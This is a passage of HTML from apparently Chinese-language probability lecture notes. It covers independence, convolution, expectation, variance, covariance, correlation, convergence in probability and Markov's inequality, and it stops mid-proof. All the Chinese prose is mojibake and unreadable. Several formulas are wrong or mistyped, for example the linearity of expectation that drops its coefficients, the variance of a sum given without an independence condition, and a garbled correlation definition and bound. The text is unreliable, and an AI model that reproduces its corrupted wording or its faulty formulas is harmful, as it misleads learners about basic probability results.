title="äºŒå…ƒå‡åŒ€åˆ†å¸ƒä¸äºŒå…ƒæ­£æ€åˆ†å¸ƒ"></a>äºŒå…ƒå‡åŒ€åˆ†å¸ƒä¸äºŒå…ƒæ­£æ€åˆ†å¸ƒ</h3><p>è‹¥äºŒå…ƒéšæœºå˜é‡(X,Y)åœ¨äºŒç»´æœ‰ç•ŒåŒºåŸŸä¸Šå–å€¼,ä¸”å…·æœ‰æ¦‚ç‡å¯†åº¦å‡½æ•°:<br>$$<br>\displaylines{f(x,y) &#x3D;<br>\begin{cases}<br>\frac{1}{D çš„é¢ç§¯}, \ \ (x,y) \in D \newline~ \newline<br>0, \ \ å…¶ä»–<br>\end{cases}}<br>$$</p><p>åˆ™ç§° $(X,Y)$ åœ¨Dä¸Šæœä»å‡åŒ€åˆ†å¸ƒ</p><p>è¢«ç§¯åˆ†çš„å‡½æ•°æ˜¯å¸¸é‡ï¼Œç§¯åˆ†çš„å€¼ä¹Ÿå°±å‡åŒ€å˜åŒ–.</p><p><img src="/../img/bivariate_normal_distrubution_from_ppt.png"></p><p><img src="/../img/bivariate_normal_distrubution_from_ppt2.png"></p><h2 id="éšæœºå˜é‡çš„ç‹¬ç«‹æ€§"><a href="#éšæœºå˜é‡çš„ç‹¬ç«‹æ€§" class="headerlink" title="éšæœºå˜é‡çš„ç‹¬ç«‹æ€§"></a>éšæœºå˜é‡çš„ç‹¬ç«‹æ€§</h2><p>åŒæ ·æ˜¯ï¼Œäº¤é›†å¯ä»¥æ¢æˆæ¦‚ç‡çš„ä¹˜ç§¯ï¼Œå°±è¯´æ˜ç‹¬ç«‹.</p><p>$$<br>\displaylines{P(X \le x, Y \le y) &#x3D; P(X \le x) P(Y \le y) \newline~ \newline<br>å³,\ \ F(x,y) &#x3D; F_X(x) F_Y(y)}<br>$$</p><p>ç§°éšæœºå˜é‡ $X,Y$ ç›¸äº’ç‹¬ç«‹.</p><p>è‹¥ $( X , Y )$ æ˜¯ç¦»æ•£å‹éšæœºå˜é‡:<br>$$<br>\displaylines{P(X &#x3D; x_i, Y &#x3D; y_j) &#x3D; P(X &#x3D; x_i) P(Y &#x3D; y_j) \newline~ \newline<br>å³, \ \ p_[ij] &#x3D; p_{i \bullet} p_{\bullet j}}<br>$$</p><p>è‹¥ $( X , Y )$ æ˜¯è¿ç»­å‹éšæœºå˜é‡:<br>$$<br>\displaylines{f(x,y) &#x3D; f_X(x)f_Y(y)}<br>$$</p><h2 id="æ³¨æ„-n-å…ƒéšæœºå˜é‡çš„ä¸€äº›æ¦‚å¿µå’Œç»“æœä»¥åŠå¤šå…ƒéšæœºå˜é‡ç›¸äº’ç‹¬ç«‹"><a href="#æ³¨æ„-n-å…ƒéšæœºå˜é‡çš„ä¸€äº›æ¦‚å¿µå’Œç»“æœä»¥åŠå¤šå…ƒéšæœºå˜é‡ç›¸äº’ç‹¬ç«‹" class="headerlink" title="æ³¨æ„ n å…ƒéšæœºå˜é‡çš„ä¸€äº›æ¦‚å¿µå’Œç»“æœä»¥åŠå¤šå…ƒéšæœºå˜é‡ç›¸äº’ç‹¬ç«‹"></a>æ³¨æ„ n å…ƒéšæœºå˜é‡çš„ä¸€äº›æ¦‚å¿µå’Œç»“æœä»¥åŠå¤šå…ƒéšæœºå˜é‡ç›¸äº’ç‹¬ç«‹</h2><h2 id="å·ç§¯å…¬å¼"><a href="#å·ç§¯å…¬å¼" class="headerlink" title="å·ç§¯å…¬å¼"></a>å·ç§¯å…¬å¼</h2><p>å½“ X ä¸ Y ç›¸äº’ç‹¬ç«‹æ—¶:<br>$$<br>\displaylines{f_Z(z) &#x3D; \int_{-\infty}^{+\infty} f_X(z-y)f_Y(y) dy &#x3D; \int_{-\infty}^{+\infty} f_X(x) f_Y(z-x) dx}<br>$$</p><h1 id="ç¬¬å››ç« -éšæœºå˜é‡çš„æ•°å­—ç‰¹å¾"><a href="#ç¬¬å››ç« -éšæœºå˜é‡çš„æ•°å­—ç‰¹å¾" class="headerlink" title="ç¬¬å››ç«  éšæœºå˜é‡çš„æ•°å­—ç‰¹å¾"></a>ç¬¬å››ç«  éšæœºå˜é‡çš„æ•°å­—ç‰¹å¾</h1><h2 id="æ•°å­¦æœŸæœ›"><a href="#æ•°å­¦æœŸæœ›" class="headerlink" title="æ•°å­¦æœŸæœ›"></a>æ•°å­¦æœŸæœ›</h2><p>æ•°å­¦æœŸæœ›ç®€ç§° <mark>æœŸæœ›</mark>, åˆå« <mark>å‡å€¼</mark>.</p><p>ä½†è¿™ä¸ªå‡å€¼ä¸æ˜¯æ‰€æœ‰ç»“æœçš„å¹³å‡å€¼,</p><p>å…¶è®¡ç®—æ˜¯:<br>$$<br>\displaylines{\sum éšæœºå˜é‡çš„å€¼\ x \times \ æ¦‚ç‡\ p \newline~ \newline<br>å³ \newline~ \newline<br>P(X &#x3D; x_k) &#x3D; p_k \ \ k&#x3D;1,2,â€¦ \newline~ \newline<br>E(X) &#x3D; \sum_{k&#x3D;1}^{+\infty} x_k p_k}<br>$$</p><p>æœ‰ç‚¹åƒé¢ç§¯è®¡ç®—ï¼Œæ¦‚ç‡æ˜¯é«˜ï¼Œå€¼æ˜¯åº•.</p><p>å½“ $X$ æ˜¯è¿ç»­å‹éšæœºå˜é‡æ—¶ï¼Œå¯ç”¨æ¦‚ç‡å¯†åº¦å‡½æ•°è®¡ç®—, æ¦‚ç‡å¯†åº¦å‡½æ•° $f(x)$ ä¸Šçš„ä¸€ä¸ªç‚¹çš„å€¼å°±æ˜¯ä¸€ä¸ªæ ·æœ¬ç‚¹çš„æ¦‚ç‡, è€Œ $x$ å°±æ˜¯è¿™ä¸ªæ ·æœ¬ç‚¹çš„å€¼ï¼Œå› æ­¤ï¼ŒæœŸæœ›çš„è®¡ç®—ä¸º:<br>$$<br>\displaylines{E(X) &#x3D; \int_{-\infty}^{+\infty} xf(x) dx}<br>$$</p><blockquote><p>ç®€å•çš„å›¾ç¤º</p></blockquote><p><img src="/../img/mathematical_expectation.jpg"></p><h3 id="éšæœºå˜é‡å‡½æ•°çš„æ•°å­¦æœŸæœ›"><a href="#éšæœºå˜é‡å‡½æ•°çš„æ•°å­¦æœŸæœ›" class="headerlink" title="éšæœºå˜é‡å‡½æ•°çš„æ•°å­¦æœŸæœ›"></a>éšæœºå˜é‡å‡½æ•°çš„æ•°å­¦æœŸæœ›</h3><p>å³ï¼Œæ­¤æ—¶çš„å˜é‡æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå•å˜é‡, æ±‚ $E(Y)$, è€Œ $Y &#x3D; g(X)$.</p><blockquote><p>å½“ $X$ æ˜¯ç¦»æ•£å‹éšæœºå˜é‡æ—¶</p></blockquote><p>åˆ†å¸ƒå¾‹ä¸º:<br>$$<br>\displaylines{P(X &#x3D; x_k) &#x3D; p_k, \ \ k&#x3D;1,2,â€¦}<br>$$<br>æ±‚æœŸæœ›ä¸º:<br>$$<br>\displaylines{E(Y) &#x3D; E[g(X)] &#x3D; \sum_{k&#x3D;1}^{\infty} g(x_k) p_k}<br>$$</p><p>å¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶å’Œæ¦‚ç‡ç›¸ä¹˜çš„æ˜¯ $X$ çš„è¡¨è¾¾å¼.</p><blockquote><p>å½“ $X$ æ˜¯è¿ç»­å‹éšæœºå˜é‡æ—¶, å¯†åº¦å‡½æ•°ä¸º $f(x)$</p></blockquote><p>æ±‚æœŸæœ›ä¸º<br>$$<br>\displaylines{E(Y) &#x3D; E(g(X)) &#x3D; \int_{-\infty}^{+\infty} g(x) f(x) dx}<br>$$</p><h4 id="æ¨å¹¿åˆ°äºŒå…ƒåŠå¤šå…ƒ"><a href="#æ¨å¹¿åˆ°äºŒå…ƒåŠå¤šå…ƒ" class="headerlink" title="æ¨å¹¿åˆ°äºŒå…ƒåŠå¤šå…ƒ"></a>æ¨å¹¿åˆ°äºŒå…ƒåŠå¤šå…ƒ</h4><blockquote><p>äºŒå…ƒç¦»æ•£å‹éšæœºå˜é‡ $(X,Y)$ çš„åˆ†å¸ƒå¾‹ä¸º:</p></blockquote><p>$$<br>\displaylines{P(X&#x3D; x_i, Y&#x3D;y_j)&#x3D; p_{ij}, \ \ i,j&#x3D;1,2,â€¦ \newline~ \newline<br>E(Z) &#x3D; E[h(X,Y)] &#x3D; \sum_{i&#x3D;1}^\infty \sum_{j&#x3D;1}^\infty h(x_i, y_j) p_{ij}}<br>$$</p><blockquote><p>äºŒå…ƒè¿ç»­å‹éšæœºå˜é‡ $(X,Y)$ çš„å¯†åº¦å‡½æ•° $f(x,y)$</p></blockquote><p>$$<br>\displaylines{E(Z) &#x3D; E(h(X,Y)) &#x3D; \int_{-\infty}^{+\infty} \int_{-\infty}^{+\infty} h(x_i, y_j) f(x,y) dx dy}<br>$$</p><h3 id="æ•°å­¦æœŸæœ›çš„ç‰¹æ€§"><a href="#æ•°å­¦æœŸæœ›çš„ç‰¹æ€§" class="headerlink" title="æ•°å­¦æœŸæœ›çš„ç‰¹æ€§"></a>æ•°å­¦æœŸæœ›çš„ç‰¹æ€§</h3><ul><li>è®¾ $C$ æ˜¯å¸¸æ•°, åˆ™æœ‰ $E(C) &#x3D; C$</li><li>è®¾ X æ˜¯éšæœºå˜é‡ï¼ŒC æ˜¯å¸¸æ•°ï¼Œåˆ™æœ‰ $E(CX) &#x3D; CE(X)$</li><li>è®¾ X,Y æ˜¯éšæœºå˜é‡, åˆ™æœ‰ $E(X+Y) &#x3D; E(X) + E(Y)$</li></ul><blockquote><p>æ¨å¹¿</p></blockquote><p>$$<br>\displaylines{E(c_0 + \sum_{i&#x3D;1}^&#x3D;n c_i X_i) &#x3D; c_0 + \sum_{i&#x3D;1}^n E(X_i)}<br>$$</p><ul><li>è®¾ $X,Y$ æ˜¯ç›¸äº’ç‹¬ç«‹éšæœºå˜é‡, åˆ™æœ‰<br>$$<br>\displaylines{E(XY) &#x3D; E(X)E(Y)}<br>$$</li></ul><blockquote><p>æ¨å¹¿</p></blockquote><p>$$<br>\displaylines{E(\prod_{i&#x3D;1}^n X_i) &#x3D; \prod_{i&#x3D;1}^n E(X_i)}<br>$$<br>å…¶ä¸­, $X_i, \ \ i&#x3D;1,â€¦,n$ ç›¸äº’ç‹¬ç«‹.</p><blockquote><p>è¯æ˜</p></blockquote><p>C æ˜¯å¸¸æ•°:</p><p>$$<br>\displaylines{P(X&#x3D;C) &#x3D; 1, \ \ E(X) &#x3D; E(C) &#x3D; 1 \times C &#x3D; C}<br>$$</p><p>X ä¸ºè¿ç»­å‹éšæœºå˜é‡:</p><p>$E(CX)$ ç›¸å½“äºæ­¤æ—¶çš„å˜é‡å€¼ä¸º $Cx$.<br>$$<br>\displaylines{E(CX) &#x3D; \int_{-\infty}^{+\infty} Cxf(x)dx &#x3D; C\int_{-\infty}^{+\infty} xf(x)dx &#x3D; CE(X)}<br>$$</p><p>$E(X+Y)$ ç›¸å½“äºæ­¤æ—¶çš„å˜é‡å€¼ä¸º $x+y$. æ¯ä¸€æ ·æœ¬ç‚¹çš„æ¦‚ç‡å€¼ä¸º $f(x,y)$</p><p>$$<br>\displaylines{E(X+Y) &#x3D; \int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty} (x+y)f(x,y) dx dy \newline~ \newline<br>&#x3D; \int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty} xf(x,y)dxdy + \int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty} yf(x,y)dxdy \newline~ \newline<br>&#x3D; E(X) + E(Y)}<br>$$</p><p>$E(XY)$ ç›¸å½“äºæ­¤æ—¶çš„å˜é‡å€¼ä¸º $xy$</p><p>$$<br>\displaylines{\int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty} xyf(x,y)dxdy \newline~ \newline<br>&#x3D; \int_{-\infty}^{+\infty}\int_{-\infty}^{+\infty} xy f_X(x) f_Y(y) dxdy \newline~ \newline<br>&#x3D; \int_{-\infty}^{+\infty} xf_X(x)dx \int_{-\infty}^{+\infty}yf_Y(y)dy \newline~ \newline<br>&#x3D; E(X)E(Y)}<br>$$<br>æ­¤æ—¶çš„ $E(X)\ \ å’Œ\ \ E(Y)$ éƒ½æ˜¯ä¸€å…ƒçš„.</p><blockquote><p>æŠ€å·§</p></blockquote><p>å°† X åˆ†è§£æˆæ•°ä¸ªéšæœºå˜é‡ä¹‹å’Œï¼Œç„¶ååˆ©ç”¨éšæœºå˜é‡å’Œçš„æ•°å­¦æœŸæœ›ç­‰äºéšæœºå˜é‡æ•°å­¦æœŸæœ›è¿™å’Œæ¥æ±‚æ•°å­¦æœŸæœ›.</p><h2 id="æ–¹å·®-Variance"><a href="#æ–¹å·®-Variance" class="headerlink" title="æ–¹å·® Variance"></a>æ–¹å·® Variance</h2><p>æ–¹å·®ç”¨äºæè¿°åç¦»ç¨‹åº¦.</p><p>ä¹Ÿæ˜¯æ±‚æœŸæœ›ï¼Œåªä¸è¿‡è¿™æ—¶çš„å˜é‡å€¼ä¸º $[ x_i - E(X) ]^2$, æ¦‚ç‡å€¼ä¸º $p_i$ æˆ– $f(x)$</p><blockquote><p>å®šä¹‰</p></blockquote><p>$$<br>\displaylines{Var(X) &#x3D; E{[X-E(X)]^2}}<br>$$</p><p><mark>æ–¹å·®</mark> è®°ä¸º $Var(X)$ æˆ– $D(X)$</p><p>å°† $\sqrt{Var(X)}$ è®°ä¸º $\sigma (X)$, ç§°ä¸º $X$ çš„ <mark>æ ‡å‡†å·®æˆ–å‡æ–¹å·®</mark>.</p><blockquote><p>å¯¹äºç¦»æ•£å‹éšæœºå˜é‡ X</p></blockquote><p>å…¶åˆ†å¸ƒå¾‹ä¸º: $P(X&#x3D;x_i) &#x3D; p_i, \ \ i&#x3D;1,2,â€¦$</p><p>$$<br>\displaylines{Var(X) &#x3D; \sum_{i&#x3D;1}^\infty [ x_i - E(X) ]^2 p_i}<br>$$</p><blockquote><p>å¯¹äºè¿ç»­å‹éšæœºå˜é‡ X</p></blockquote><p>å…¶å¯†åº¦å‡½æ•°ä¸º $f(x)$</p><p>$$<br>\displaylines{Var(X) &#x3D; \int_{-\infty}^{+\infty} [x-E(X)]^2 f(x)dx}<br>$$</p><p><mark>å¿ƒå¾—</mark> :<br>ç¦»æ•£å‹éšæœºå˜é‡ X çš„æ¦‚ç‡å€¼ç”¨ <mark>åˆ†å¸ƒå¾‹</mark> æè¿°.</p><p>è¿ç»­å‹éšæœºå˜é‡ X çš„æ¦‚ç‡å€¼ç”¨ <mark>å¯†åº¦å‡½æ•°</mark> æè¿°.</p><blockquote><p>æ–¹å·®è®¡ç®—å…¬å¼</p></blockquote><p>$$<br>\displaylines{Var(X) &#x3D; E(X^2) - [E(X)]^2}<br>$$</p><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{Var(X) &#x3D; E{ [ X-E(X) ]^2 } \newline~ \newline<br>&#x3D; E{ X^2 - 2XE(X) + [E(X)]^2 } \newline~ \newline<br>&#x3D; E(X^2) - E(2XE(X)) + E([E(X)]^2) \newline~ \newline<br>&#x3D; E(X^2) - \int_{-\infty}^{+\infty} 2xE(X) f(x)dx + \int_{-\infty}^{+\infty} [E(X)]^2 f(x)dx \newline~ \newline<br>&#x3D; E(X^2) -2\int_{-\infty}^{+\infty} xf(x)dx \int_{-\infty}^{+\infty} xf(x)dx + \int_{-\infty}^{+\infty} f(x)dx \int_{-\infty}^{+\infty} xf(x)dx \int_{-\infty}^{+\infty} xf(x) dx \newline~ \newline<br>&#x3D; E(X^2) - 2[E(X)]^2 + [E(X)]^2 \newline~ \newline<br>&#x3D; E(X^2) - [E(X)]^2}<br>$$</p><p>æ¨å¯¼è¿‡ç¨‹ä¸­å¯ä»¥å‘ç°ï¼Œ $E(XE(X)) &#x3D; E(E(X)^2) &#x3D; [E(X)]^2$ </p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>è®¾ C æ˜¯å¸¸æ•°, åˆ™ $Var(C) &#x3D; 0$</li></ul><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{Var(C) &#x3D; E{[ C - E(C) ]^2} &#x3D; E{[ C - C ]^2} &#x3D; 0}<br>$$</p><ul><li>è®¾ X æ˜¯éšæœºå˜é‡ï¼ŒCæ˜¯å¸¸æ•°ï¼Œåˆ™æœ‰ $Var(CX) &#x3D; C^2 Var(X)$</li></ul><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{Var(CX) &#x3D; E((CX)^2) - [E(CX)]^2 \newline~ \newline<br>&#x3D; C^2 E(X^2) - C^2 [E(X)]^2 \newline~ \newline<br>&#x3D; C^2 {E(X^2) - [E(X)]^2} \newline~ \newline<br>C^2 Var(X)}<br>$$</p><ul><li>è®¾ $X,Y$ æ˜¯ä¸¤ä¸ªéšæœºå˜é‡ï¼Œåˆ™æœ‰:<br>$$<br>\displaylines{Var(X+Y) &#x3D; Var(X) + Var(Y) + 2E{[X-E(X)][Y-E(Y)]}}<br>$$<br>è‹¥ $X,Y$ ç›¸äº’ç‹¬ç«‹ï¼Œåˆ™æœ‰ $Var(X+Y) &#x3D; Var(X) + Var(Y)$</li></ul><blockquote><p>æ¨å¹¿</p></blockquote><p>$$<br>\displaylines{Var(aX + bY + c) &#x3D; a^2 Var(X) + b^2 Var(Y) \newline~ \newline<br>Var(c_0 + \sum_{i&#x3D;1}^n c_i X_i) &#x3D; \sum_{i&#x3D;1}^n c_i^2 Var(X_i)}<br>$$</p><ul><li>$Var(X) &#x3D; 0 \Leftrightarrow P(X&#x3D;C)&#x3D;1, \ \ å³ E(X)&#x3D;xp &#x3D; C P(X&#x3D;C) &#x3D; C \times 1 &#x3D; C$</li></ul><h3 id="å‡ ç§å¸¸è§åˆ†å¸ƒçš„æœŸæœ›å’Œæ–¹å·®"><a href="#å‡ ç§å¸¸è§åˆ†å¸ƒçš„æœŸæœ›å’Œæ–¹å·®" class="headerlink" title="å‡ ç§å¸¸è§åˆ†å¸ƒçš„æœŸæœ›å’Œæ–¹å·®"></a>å‡ ç§å¸¸è§åˆ†å¸ƒçš„æœŸæœ›å’Œæ–¹å·®</h3><p><img src="/../img/expectation_and_variance_of_common_distribution.png"></p><h3 id="ç‹¬ç«‹çš„-n-ä¸ªæ­£æ€å˜é‡çš„çº¿æ€§ç»„åˆä»æœä»æ­£æ€åˆ†å¸ƒ"><a href="#ç‹¬ç«‹çš„-n-ä¸ªæ­£æ€å˜é‡çš„çº¿æ€§ç»„åˆä»æœä»æ­£æ€åˆ†å¸ƒ" class="headerlink" title="ç‹¬ç«‹çš„ n ä¸ªæ­£æ€å˜é‡çš„çº¿æ€§ç»„åˆä»æœä»æ­£æ€åˆ†å¸ƒ"></a>ç‹¬ç«‹çš„ n ä¸ªæ­£æ€å˜é‡çš„çº¿æ€§ç»„åˆä»æœä»æ­£æ€åˆ†å¸ƒ</h3><p><img src="/../img/dependent_normal_distribution_variable_s_linear_conbination.png"></p><h3 id="æ ‡å‡†åŒ–å˜é‡"><a href="#æ ‡å‡†åŒ–å˜é‡" class="headerlink" title="æ ‡å‡†åŒ–å˜é‡"></a>æ ‡å‡†åŒ–å˜é‡</h3><blockquote><p>å®šä¹‰</p></blockquote><p>è®¾éšæœºå˜é‡ X å…·æœ‰:</p><ul><li>æ•°å­¦æœŸæœ› $E(X) &#x3D; \mu$</li><li>æ–¹å·® $Var(X) &#x3D; \sigma^2 \ne 0$</li></ul><p>è®° $X^\ast &#x3D; \frac{X- \mu}{\sigma}$ åˆ™ç§° $X^\ast$ ä¸º $X$ çš„ <mark>æ ‡å‡†åŒ–å˜é‡</mark> </p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$E(X^\ast) &#x3D; 0$</li><li>$Var(X^\ast) &#x3D; 1$</li></ul><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{E(X^\ast) &#x3D; \frac{1}{\sigma} E(X - \mu) &#x3D; \frac{1}{\sigma}[E(X) - \mu] \newline~ \newline<br>\because E(X) &#x3D; \mu \newline~ \newline<br>\therefore E(X^\ast) &#x3D; 0 \newline~ \newline<br>also \newline~ \newline<br>Var(X^\ast) &#x3D; E(X^{\ast^2}) - [E(X^\ast)]^2 &#x3D; E[( \frac{X - \mu}{\sigma} )^2] \newline~ \newline<br>&#x3D; \frac{1}{\sigma^2} E[(X- \mu)^2] &#x3D; \frac{\sigma^2}{\sigma^2} &#x3D; 1}<br>$$</p><h2 id="åæ–¹å·®ä¸ç›¸å…³ç³»æ•°"><a href="#åæ–¹å·®ä¸ç›¸å…³ç³»æ•°" class="headerlink" title="åæ–¹å·®ä¸ç›¸å…³ç³»æ•°"></a>åæ–¹å·®ä¸ç›¸å…³ç³»æ•°</h2><h3 id="åæ–¹å·®"><a href="#åæ–¹å·®" class="headerlink" title="åæ–¹å·®"></a>åæ–¹å·®</h3><blockquote><p>å®šä¹‰</p></blockquote><p>$E{[X-E(X)][Y-E(Y)]}$ ç§°ä¸ºéšæœºå˜é‡ X ä¸ Y çš„ <mark>åæ–¹å·®</mark> , è®°ä¸º $Cov(X,y)$, å³:<br>$$<br>\displaylines{Cov(X,Y) &#x3D; E{[X-E(X)][Y-E(Y)]}}<br>$$</p><blockquote><p>è®¡ç®—å…¬å¼</p></blockquote><p>$$<br>\displaylines{Cov(X,Y) &#x3D; E(XY) - E(X)E(Y)}<br>$$</p><blockquote><p>å’Œæ–¹å·®ç›¸å…³çš„æ€§è´¨</p></blockquote><p>$$<br>\displaylines{Var(X+Y) &#x3D; Var(X) + Var(Y) + 2Cov(X,Y)}<br>$$</p><blockquote><p>åæ–¹å·®çš„æ€§è´¨</p></blockquote><ul><li>$Cov(X,Y) &#x3D; Cov(Y,X)$</li><li>$Cov(X,X) &#x3D; Var(X)$</li><li>$Cov(aX,bY) &#x3D; ab \cdot Cov(X,Y)$, å…¶ä¸­ $a,b$ ä¸ºä¸¤ä¸ªå®æ•°</li><li>$Cov(X_1 + X_2, Y) &#x3D; Cov(X_1, Y) + Cov(X_2, Y)$</li><li>å½“ $Var(X)Var(Y) \ne 0$ æ—¶ï¼Œæœ‰ $(Cov(X,Y))^2  \le Var(X)Var(Y)$</li></ul><h3 id="ç›¸å…³ç³»æ•°"><a href="#ç›¸å…³ç³»æ•°" class="headerlink" title="ç›¸å…³ç³»æ•°"></a>ç›¸å…³ç³»æ•°</h3><blockquote><p>å®šä¹‰</p></blockquote><p>$\rho_{XY} &#x3D; \frac{Cov(X,Y)}{\sqrt{Var(X)Var(Y)}}$ ç§°ä¸º X ä¸ Y çš„ <mark>ç›¸å…³ç³»æ•°</mark> .</p><p>$$<br>\displaylines{\pho_{XY} &#x3D; Cov( \frac{X - E(X)}{\sqrt{Var(X)}}, \frac{X - E(Y)}{\sqrt{Var(Y)}} )}<br>$$</p><blockquote><p>æ€§è´¨</p></blockquote><ul><li>$\left\vert \rho_{XY} \le 1 \right\vert$ </li><li>$\left\vert \rho_{XY} &#x3D; 1 \right\vert \Leftrightarrow$ å­˜åœ¨å¸¸æ•° a,b, ä½¿ $P(Y&#x3D;a+bX) &#x3D; 1$, $\rho_{XY} &#x3D; 1$ æ—¶, $b &gt; 0$; $\rho &#x3D; -1$ æ—¶, $b &lt; 0$</li></ul><p><mark>ç›¸å…³ç³»æ•° $\rho_{XY}$</mark>  æ˜¯ä¸€ä¸ªç”¨æ¥è¡¨å¾ $X,Y$ ä¹‹é—´ <mark>çº¿æ€§å…³ç³»ç´§å¯†ç¨‹åº¦</mark> çš„é‡ã€‚</p><p>å½“ $\left\vert \rho_{XY} \right\vert$ è¾ƒå¤§æ—¶ï¼Œè¡¨æ˜ X,Y çº¿æ€§å…³ç³»çš„ç¨‹åº¦è¾ƒå¥½.</p><p>å½“ $\rho_{XY} &gt; 0$ æ—¶ï¼Œç§° X ä¸ Y ä¸º <mark>æ­£ç›¸å…³</mark> </p><p>å½“ $\rho_{XY} &lt; 0$ æ—¶ï¼Œç§° X ä¸ Y ä¸º <mark>è´Ÿç›¸å…³</mark> </p><h3 id="ä¸ç›¸å…³æˆ–é›¶ç›¸å…³"><a href="#ä¸ç›¸å…³æˆ–é›¶ç›¸å…³" class="headerlink" title="ä¸ç›¸å…³æˆ–é›¶ç›¸å…³"></a>ä¸ç›¸å…³æˆ–é›¶ç›¸å…³</h3><blockquote><p>å®šä¹‰</p></blockquote><p>$\rho_{XY} &#x3D; 0$ ç§° <mark>X ä¸ Y ä¸ç›¸å…³æˆ–é›¶ç›¸å…³</mark> </p><p>ç­‰ä»·æ¡ä»¶æœ‰:</p><ul><li>$Cov(X,Y) &#x3D; 0$</li><li>$E(XY) &#x3D; E(X) E(Y)$</li><li>$Var(X+Y) &#x3D; Var(X) + Var(Y)$</li></ul><p>X,Y ç›¸äº’ç‹¬ç«‹ï¼Œä¸¤è€…ä¸€å®šä¸ç›¸å…³.</p><p>X,Y ä¸ç›¸å…³ï¼Œä¸¤è€…ä¸ä¸€å®šç›¸äº’ç‹¬ç«‹.</p><h2 id="å…¶ä»–æ•°å­—ç‰¹å¾"><a href="#å…¶ä»–æ•°å­—ç‰¹å¾" class="headerlink" title="å…¶ä»–æ•°å­—ç‰¹å¾"></a>å…¶ä»–æ•°å­—ç‰¹å¾</h2><p><img src="/../img/another_number_character1.png"></p><p><img src="/../img/another_number_character2.png"></p><h2 id="å¤šå…ƒéšæœºå˜é‡çš„æ•°å­—ç‰¹å¾"><a href="#å¤šå…ƒéšæœºå˜é‡çš„æ•°å­—ç‰¹å¾" class="headerlink" title="å¤šå…ƒéšæœºå˜é‡çš„æ•°å­—ç‰¹å¾"></a>å¤šå…ƒéšæœºå˜é‡çš„æ•°å­—ç‰¹å¾</h2><h1 id="ç¬¬äº”ç« -å¤§æ•°å®šå¾‹å’Œä¸­å¿ƒæé™å®šç†"><a href="#ç¬¬äº”ç« -å¤§æ•°å®šå¾‹å’Œä¸­å¿ƒæé™å®šç†" class="headerlink" title="ç¬¬äº”ç«  å¤§æ•°å®šå¾‹å’Œä¸­å¿ƒæé™å®šç†"></a>ç¬¬äº”ç«  å¤§æ•°å®šå¾‹å’Œä¸­å¿ƒæé™å®šç†</h1><h2 id="ä¾æ¦‚ç‡æ”¶æ•›"><a href="#ä¾æ¦‚ç‡æ”¶æ•›" class="headerlink" title="ä¾æ¦‚ç‡æ”¶æ•›"></a>ä¾æ¦‚ç‡æ”¶æ•›</h2><p>è¿™é‡Œè®²çš„æ˜¯ï¼Œå½“äº‹ä»¶æ¬¡æ•°æå¤šæ—¶ (å³å¤§æ•°), æ¦‚ç‡ä¼šè¶‹äºä¸€ä¸ªå¸¸é‡.</p><p>éšæœºå˜é‡åºåˆ— $Y_1, Y_2, Y_3,â€¦,$ è‹¥å­˜åœ¨æŸå¸¸æ•° c, ä½¿å¾— $\forall \epsilon, $ å‡æœ‰<br>$$<br>\displaylines{\lim_{n \rightarrow + \infty} P{ \left\vert Y_n -c \right\vert \ge \epsilon} &#x3D; 0}<br>$$</p><p>å³ ${Y_n, n \ge 1}$ ä¾æ¦‚ç‡æ”¶æ•›äºå¸¸æ•° c.</p><p>$\left\vert Y_n - c \right\vert \ge \epsilon$ çš„å«ä¹‰æ˜¯ï¼Œè·å¸¸æ•° c å¤§å°ç›¸å·® $\epsilon$ çš„è·ç¦»å­˜åœ¨éšæœºå˜é‡å€¼.</p><blockquote><p>æ€§è´¨</p></blockquote><p>è‹¥ $X_n \overset{P}{\longrightarrow} a, Y_n \overset{P}{\longrightarrow} b,$ g åœ¨ $(a,b)$ è¿ç»­ï¼Œåˆ™<br>$$<br>\displaylines{g(X_n,Y_n) \overset{P}{\longrightarrow} g(a,b)}<br>$$</p><h2 id="é©¬å°”å¯å¤«ä¸ç­‰å¼å’Œåˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼"><a href="#é©¬å°”å¯å¤«ä¸ç­‰å¼å’Œåˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼" class="headerlink" title="é©¬å°”å¯å¤«ä¸ç­‰å¼å’Œåˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼"></a>é©¬å°”å¯å¤«ä¸ç­‰å¼å’Œåˆ‡æ¯”é›ªå¤«ä¸ç­‰å¼</h2><h3 id="é©¬å°”å¯å¤«ä¸ç­‰å¼"><a href="#é©¬å°”å¯å¤«ä¸ç­‰å¼" class="headerlink" title="é©¬å°”å¯å¤«ä¸ç­‰å¼"></a>é©¬å°”å¯å¤«ä¸ç­‰å¼</h3><p>è®¾éšæœºå˜é‡ Y çš„ k é˜¶çŸ©å­˜åœ¨ ( $k \ge 1$ ), å³ $E(X^k)$ å­˜åœ¨ï¼Œåˆ™å¯¹ä»»æ„ $\epsilon &gt; 0$ éƒ½æœ‰:<br>$$<br>\displaylines{P{ \left\vert Y \right\vert \ge \epsilon } \le \frac{E( \left\vert Y \right\vert ^k )}{\epsilon^k}}<br>$$<br>æˆç«‹.</p><p>ç­‰ä»·äº:<br>$$<br>\displaylines{P{ \left\vert Y \right\vert &lt; \epsilon } \ge 1 - \frac{E( \left\vert Y \right\vert ^k )}{\epsilon^k}}<br>$$</p><blockquote><p>è¯æ˜</p></blockquote><p>å¯¹äºä»»æ„ $\epsilon &gt; 0$, ä»¤<br>$$<br>\displaylines{Z &#x3D;<br>\begin{cases}<br>\epsilon, å½“ \left\vert Y \right\vert \ge \epsilon \newline~ \newline<br>0, å½“ \left\vert Y \right\vert &lt; \epsilon<br>\end{cases}}<br>$$</p><p>åˆ™ $Z \le \left\vert Y \right\vert \ \Rightarrow \ Z^k \le \left\vert Y \right\vert ^k \Rightarrow \ E(Z^k) \le E( \left\vert Y \right\vert ^k )$</p><p>$$<br>\displaylines{\because E(Z^k) &#x3D; \epsilon^k 